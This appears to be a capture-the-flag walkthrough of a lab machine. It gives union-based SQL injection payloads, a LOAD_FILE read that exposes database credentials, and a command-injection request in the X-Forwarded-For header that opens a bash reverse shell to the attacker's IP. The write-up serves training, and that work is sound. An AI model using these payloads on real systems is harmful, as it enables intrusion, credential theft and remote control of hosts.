# Steps
Starting off with a basic nmap scan and saving the results to a file
`nmap -sC -sV -A -oA union/scan 10.129.96.75`

```Bash
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-28 21:42 -0500
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 90.25% done; ETC: 21:42 (0:00:01 remaining)
Nmap scan report for 10.129.96.75
Host is up (0.052s latency).
Not shown: 999 filtered tcp ports (no-response)


# Port to be found and the type of website
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0 (Ubuntu)
# This tells us it is a php application
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Site doesnt have a title (text/html; charset=UTF-8).
|_http-server-header: nginx/1.18.0 (Ubuntu)



Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   48.57 ms 10.10.14.1
2   50.83 ms 10.129.96.75
```
_<div style="page-break-after: always;"></div>_

In this code clip, one can see the port that is running and that the site is based on php.
Next going to the site of `10.129.96.75`
![[Pasted image 20260128215138.png]]

Being prompted, put in a random name of TOM
```php
Congratulations tom you may compete in this tournament!  
  
Complete the challenge [here](http://10.129.96.75/challenge.php)
```

Going to the link, it goes to a flag submission screen....seems like a dead end
![[Pasted image 20260128225826.png]]_<div style="page-break-after: always;"></div>_

Since this is a php request function, best to use burpsuite.
Open burpsuite and turn interceptor on and go to the site. 
Put in a request for a name and go to repeater to dig deeper into the site.
![[Pasted image 20260128215922.png]]

Since we know that the player is requesting and getting information, stick with that for the query.
Doing a basic
`player=player' union select * 1-- -`
![[Pasted image 20260128221144.png]]
_<div style="page-break-after: always;"></div>_

This demonstrates the possibility of returning data from the query.
Now what about being able to find where we are at on the database?
Doing `player=player' union select schema_name from information_schema.schemata-- -`
Shows the first option of mysql (This is the first sign that we can get queries through.)
![[Pasted image 20260128221336.png]]

Now lets see what all tables are out there
`player=player' union select group_concat(schema_name) from information_schema.schemata-- -`

```bash
# The table of november seems to be the one sticking out
Sorry, mysql,information_schema,performance_schema,sys,november you are not eligible due to already qualifying.
```
_<div style="page-break-after: always;"></div>_

With that information we can now starting digging into the table of `november`
`player=player' union select group_concat(TABLE_NAME, ":", COLUMN_NAME, "\n") from information_schema.columns where TABLE_SCHEMA like 'november' -- -`

```bash
# This shows us the column names 
Sorry, flag:one
,players:player
 you are not eligible due to already qualifying.
```
Now that we know what the content of each column is the next step is to find what the rows are for more information
*NOTE*: The reason in finding the column before the row is this allows us to have context over what we are looking at on the table.

If wanting to find the players,
`player=player' union select group_concat(player, "\n") from november.players -- -`
This will give the output of
```bash
Sorry, ippsec
,celesian
,big0us
,luska
,tinyboy
 you are not eligible due to already qualifying.
```

But if you remember early when able to get into the page with a valid name, a flag box was presented. And just so happens we have a flag table. So....
`player=player' union select group_concat(one, "\n") from november.flag -- -
```bash

Sorry, UHC{F1rst_5tep_2_Qualify}
 you are not eligible due to already qualifying.
```
_<div style="page-break-after: always;"></div>_

Lets see if this is the flag!
Entering in the flag, this appears.
![[Pasted image 20260128230113.png]]

Now the SSH port was not open on the original scan, but now that the site says it is lets verify
![[Pasted image 20260128232236.png]]
Using the banner grabbing options of `netcat` you can see the port is now accessible
Anonymous login didnt work so lets check for credentials on the SQL site.
Since we know that PHP is the base, some useful tables on the server could be `index.php and config.php`

Using
`player=player' union select LOAD_FILE('/var/www/html/index.php') -- -`
On the index, did not come up with anything, config.php did!!!
`player=player' union select LOAD_FILE('/var/www/html/config.php') -- -`
```php

Sorry, <?php
  session_start();
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-11qual-global-pw";
  $dbname = "november";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
 you are not eligible due to already qualifying.
```
_<div style="page-break-after: always;"></div>_

Now that we have credentials lets see if ssh will let us in!
![[Pasted image 20260128233135.png]]

And we are in!
From here we `cat user.txt` for the flag
![[Pasted image 20260128233330.png]]
Since we were pulling information from the `/var/www/html` directory lets see wwhat else is there
Looking through the files, the only one 'out of place' or that we could not pull was the `firewall.php`
```php
<?php
require('config.php');

if (!($_SESSION['Authenticated'])) {
  echo "Access Denied";
  exit;
}

?>
<link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<!------ Include the above in your HEAD tag ---------->

<div class="container">
                <h1 class="text-center m-5">Join the UHC - November Qualifiers</h1>

        </div>
        <section class="bg-dark text-center p-5 mt-4">
                <div class="container p-5">
                
                
# This php statement tells us it forwards the queries to the server user!
<?php
  if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  } else {
    $ip = $_SERVER['REMOTE_ADDR'];
  };
  system("sudo /usr/sbin/iptables -A INPUT -s " . $ip . " -j ACCEPT");
?>
              <h1 class="text-white">Welcome Back!</h1>
              <h3 class="text-white">Your IP Address has now been granted SSH Access.</h3>
                </div>
        </section>
</div>

```
Based on this and the comment I provided in the code, lets see if we can reverse shell into the machine!

Now, going back to the 10.129.96.75/firewall in our burpsuite we can intercept the POST request and put in a reverse shell
```php
POST /firewall.php HTTP/1.0
Host: 10.129.96.75
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=vqf04mkbbltbmmn83lr2iib8uc
Connection: close
X-FORWARDED-FOR: ;bash -c 'bash -i >& /dev/tcp/10.10.15.194/7777 0>&1 &'
```

Making sure to close the connection and add the reverse shell, this will connect to the netcat listener!
![[Pasted image 20260129010036.png]]
Looking back on the firewall.php, it had permissions to run sudo.
Checking what sudo can do, it does not need a password to access root.
`sudo -l`
![[Pasted image 20260129010102.png]]
Once I logged escalated, I upgraded by shell (Machine does not have python).
Upgrading the shell using  `/bin/sh -i`
![[Pasted image 20260129010319.png]]
From there the root flag was found!